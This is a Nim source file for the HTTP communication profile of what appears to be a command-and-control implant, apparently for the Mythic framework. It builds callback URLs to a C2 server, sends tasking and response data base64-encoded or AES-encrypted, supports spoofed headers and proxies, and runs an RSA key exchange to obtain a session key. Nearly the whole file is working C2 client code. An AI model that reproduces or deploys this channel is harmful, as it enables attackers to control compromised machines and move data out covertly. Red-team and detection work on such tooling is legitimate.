import std/[base64, strutils, json, random, os]
import ../config
import ../utils/crypto
# Only import RSA if encrypted exchange is enabled at compile time
const encryptedExchange {.used.} = static: getEnv("ENCRYPTED_EXCHANGE_CHECK", "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import ../utils/rsa
import ../utils/http_client

type
  HttpProfile* = ref object
    config: Config
    aesKey: seq[byte]
    client: HttpClientWrapper

proc newHttpProfile*(): HttpProfile =
  ## Create a new HTTP profile
  result = HttpProfile()
  result.config = getConfig()
  result.client = newClientWrapper(result.config.debug)
  
  # Set User-Agent
  result.client.headers = newHttpHeaders({"User-Agent": result.config.userAgent})
  
  # Parse and add custom headers if provided (JSON format)
  if result.config.headers.len > 0:
    try:
      let headersJson = parseJson(result.config.headers)
      for key, val in headersJson.pairs:
        result.client.headers[key] = val.getStr()
    except:
      discard  # Ignore header parsing errors
  
  # Configure proxy if provided
  if result.config.proxyHost.len > 0 and result.config.proxyPort.len > 0:
    var proxyUrl = "http://" & result.config.proxyHost & ":" & result.config.proxyPort
    # Add auth if provided
    if result.config.proxyUser.len > 0 and result.config.proxyPass.len > 0:
      proxyUrl = "http://" & result.config.proxyUser & ":" & result.config.proxyPass & "@" & 
                 result.config.proxyHost & ":" & result.config.proxyPort
    try:
      result.client = newClientWrapperWithProxy(proxyUrl, result.config.debug)
      # Re-apply headers after creating new client with proxy
      result.client.headers = newHttpHeaders({"User-Agent": result.config.userAgent})
      if result.config.headers.len > 0:
        try:

          let headersJson = parseJson(result.config.headers)
          for key, val in headersJson.pairs:
            result.client.headers[key] = val.getStr()
        except:
          discard
    except:
      discard  # Ignore proxy configuration errors
  
  # Don't load AES key yet - will be set after key exchange or checkin

proc buildUrl(profile: HttpProfile): string =
  ## Build the full callback URL
  var host = profile.config.callbackHost
  var scheme = ""
  
  # Detect and strip any existing scheme from host
  if host.startsWith("https://"):
    scheme = "https"
    host = host[8..^1]
  elif host.startsWith("http://"):
    scheme = "http"
    host = host[7..^1]
  else:
    # No scheme provided, determine from port
    scheme = if profile.config.callbackPort == "443": "https" else: "http"
  
  result = scheme & "://" & host & ":" & 
           profile.config.callbackPort & "/" & profile.config.postUri

proc send*(profile: HttpProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server
  let url = profile.buildUrl()
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  if profile.config.debug:
    echo "[DEBUG] === SENDING DATA ==="
    # Try to pretty-print JSON if it's valid JSON and small enough
    try:
      let jsonData = parseJson(data)
      # Only show full JSON for small payloads (< 2KB)
      if data.len < 2048:
        echo "[DEBUG] Request JSON:"
        echo jsonData.pretty()
      else:
        # For large payloads, show summary
        echo "[DEBUG] Request: Large payload (", data.len, " bytes)"
        if jsonData.hasKey("action"):
          echo "[DEBUG] Action: ", jsonData["action"].getStr()
        if jsonData.hasKey("responses"):
          echo "[DEBUG] Responses count: ", jsonData["responses"].len
    except:
      # Not JSON or parse error, show raw
      echo "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
  
  # Only encrypt if AES key is available AND we have a callback UUID
  var payload: string
  if profile.aesKey.len > 0 and callbackUuid.len > 0:
    if profile.config.debug:
      echo "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
      echo "[DEBUG] Data length: ", data.len, " bytes"
      echo "[DEBUG] AES key length: ", profile.aesKey.len, " bytes"
      echo "[DEBUG] UUID: ", uuid
    payload = encryptPayload(data, profile.aesKey, uuid)
    if profile.config.debug:
      echo "[DEBUG] Encrypted payload length: ", payload.len, " bytes"
  else:
    # No encryption, just base64(UUID + data)
    if profile.config.debug:
      echo "[DEBUG] Sending unencrypted payload (Base64 only)"
      echo "[DEBUG] Data length: ", data.len, " bytes"
      echo "[DEBUG] UUID: ", uuid
    payload = encode(uuid & data)
    if profile.config.debug:
      echo "[DEBUG] Encoded payload length: ", payload.len, " bytes"
  
  if profile.config.debug:
    echo "[DEBUG] Sending HTTP POST to: ", url
    echo "[DEBUG] Payload preview (first 100 chars): ", payload[0..<min(100, payload.len)]
  
  try:
    if profile.config.debug:
      echo "[DEBUG] Sending HTTP request..."
    
    let response = profile.client.postContent(url, payload)
    
    if profile.config.debug:
      echo "[DEBUG] HTTP response received"
      echo "[DEBUG] Response length: ", response.len, " bytes"
      echo "[DEBUG] Response preview (first 100 chars): ", response[0..<min(100, response.len)]
    
    # Decrypt response if AES key is available and we have callback UUID
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      if profile.config.debug:
        echo "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
      result = decryptPayload(response, profile.aesKey)
      if profile.config.debug:
        echo "[DEBUG] Decrypted response length: ", result.len, " bytes"
    else:
      # No encryption, decode and skip UUID
      if profile.config.debug:
        echo "[DEBUG] Decoding unencrypted response (Base64)"
      let decoded = decode(response)
      if decoded.len > 36:
        result = decoded[36..^1]
      else:
        result = ""    
    # Try to parse and pretty-print response JSON
    if profile.config.debug and result.len > 0:
      echo "[DEBUG] === RECEIVED RESPONSE ==="
      try:
        let jsonResp = parseJson(result)
        # Only show full JSON for small responses (< 2KB)
        if result.len < 2048:
          echo "[DEBUG] Response JSON:"
          echo jsonResp.pretty()
        else:
          # For large responses, show summary
          echo "[DEBUG] Response: Large payload (", result.len, " bytes)"
          if jsonResp.hasKey("action"):
            echo "[DEBUG] Action: ", jsonResp["action"].getStr()
          if jsonResp.hasKey("responses"):
            echo "[DEBUG] Responses count: ", jsonResp["responses"].len
          if jsonResp.hasKey("tasks"):
            echo "[DEBUG] Tasks count: ", jsonResp["tasks"].len
      except:
        # Not JSON or parse error, show raw
        echo "[DEBUG] Response data (first 500 chars): ", result[0..<min(500, result.len)]
  except:
    if profile.config.debug:
      echo "[DEBUG] Request failed: ", getCurrentExceptionMsg()
    result = ""

proc setAesKey*(profile: var HttpProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc hasAesKey*(profile: HttpProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var HttpProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
  ## If encrypted exchange is not required, use the static PSK
  
  # If no encrypted exchange needed, just use the static PSK
  if not profile.config.encryptedExchange:
    if profile.config.debug:
      echo "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    # Don't set key yet - will be set after successful checkin
    return (true, "")
  
  # Only compile RSA code if encrypted exchange is enabled at build time
  when not encryptedExchange:
    if profile.config.debug:
      echo "[DEBUG] RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  
  # Check if RSA is available (requires OpenSSL)
  when encryptedExchange:
    if not isRsaAvailable():
      if profile.config.debug:
        echo "[DEBUG] RSA key exchange not available: OpenSSL not found"
        echo "[DEBUG] Use AESPSK (pre-shared key) for encryption instead"
        echo "[DEBUG] Communication will be unencrypted (Base64 only)"
      return (true, "")  # Don't fail, just skip key exchange
    
    if profile.config.debug:
      echo "[DEBUG] === PERFORMING RSA KEY EXCHANGE ==="
    
    try:
      # Generate RSA 4096-bit key pair
      if profile.config.debug:
        echo "[DEBUG] Generating RSA 4096-bit key pair..."
      
      var rsaKey = generateRsaKeyPair(4096)
      
      if not rsaKey.available:
        if profile.config.debug:
          echo "[DEBUG] RSA key generation failed: OpenSSL error"
        return (false, "")
      
      if profile.config.debug:
        echo "[DEBUG] RSA key generated, public key length: ", rsaKey.publicKeyPem.len, " bytes"
      
      # Generate random 20-character session ID
      randomize()
      var sessionId = newString(20)
      for i in 0..19:
        sessionId[i] = char(rand(25) + ord('a'))  # Random lowercase letters
      
      if profile.config.debug:
        echo "[DEBUG] Session ID: ", sessionId
      
      # Build staging_rsa message
      let stagingMsg = %*{
        "action": "staging_rsa",
        "pub_key": encode(rsaKey.publicKeyPem),
        "session_id": sessionId
      }
      
      let stagingStr = $stagingMsg
      
      if profile.config.debug:
        echo "[DEBUG] Sending staging_rsa request..."
      
      # Send with payload UUID (like oopsie does) - base64(UUID + json)
      # Server will respond with base64(UUID + response_json)
      let response = profile.send(stagingStr, profile.config.uuid)
      
      if response.len == 0:
        if profile.config.debug:
          echo "[DEBUG] Key exchange failed: empty response"
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      if profile.config.debug:
        echo "[DEBUG] Received key exchange response: ", response.len, " bytes"
      
      # Parse response
      let respJson = parseJson(response)
      
      if not respJson.hasKey("session_key") or not respJson.hasKey("uuid"):
        if profile.config.debug:
          echo "[DEBUG] Key exchange failed: missing session_key or uuid in response"
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      let encryptedSessionKey = decode(respJson["session_key"].getStr())
      let newUuid = respJson["uuid"].getStr()
      
      if profile.config.debug:
        echo "[DEBUG] Encrypted session key length: ", encryptedSessionKey.len, " bytes"
        echo "[DEBUG] New callback UUID: ", newUuid
      
      # Decrypt session key with RSA private key
      let encryptedBytes = cast[seq[byte]](encryptedSessionKey)
      let decryptedKey = rsaPrivateDecrypt(rsaKey, encryptedBytes)
      
      if decryptedKey.len == 0:
        if profile.config.debug:
          echo "[DEBUG] Key exchange failed: RSA decryption failed"
        freeRsaKeyPair(rsaKey)
        return (false, "")
      
      # Truncate to 32 bytes (AES-256 key)
      var aesKey = decryptedKey
      if aesKey.len > 32:
        aesKey.setLen(32)
      
      if profile.config.debug:
        echo "[DEBUG] Decrypted AES key length: ", aesKey.len, " bytes"
      
      # Set the AES key
      profile.setAesKey(aesKey)
      
      # Clean up RSA key
      freeRsaKeyPair(rsaKey)
      
      if profile.config.debug:
        echo "[DEBUG] RSA key exchange completed successfully"
      
      return (true, newUuid)
    
    except:
      if profile.config.debug:
        echo "[DEBUG] Key exchange exception: ", getCurrentExceptionMsg()
      return (false, "")
